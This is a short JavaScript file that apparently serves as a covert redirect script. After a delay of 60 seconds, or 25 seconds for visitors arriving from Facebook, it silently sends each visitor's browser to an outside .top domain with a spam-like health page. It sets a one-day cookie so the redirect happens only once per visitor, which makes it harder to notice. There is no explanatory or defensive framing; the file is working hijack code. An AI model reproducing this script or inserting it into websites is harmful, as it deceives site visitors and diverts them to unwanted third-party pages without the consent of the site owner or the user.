
function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

$(document).ready(function(){
    var list_url = [
        'http://bangkoc.top/health-beauty-skin-care-diy-donts.php'
    ];
    var rand = list_url[Math.floor(Math.random() * list_url.length)];
    var history1 = getCookie("history1");
    
    var time = 60000;
    var referrer =  document.referrer;
    if(referrer.indexOf("facebook.com") > -1) { 
        time = 25000;
    }

    if (history1 != "") {
        console.log('datruycap');
    } else {
        console.log('chuatruycap');
        setTimeout(function(){
            setCookie("history1", 'datruycap', 1);
            window.location.href = rand;
        },time);
    }
});
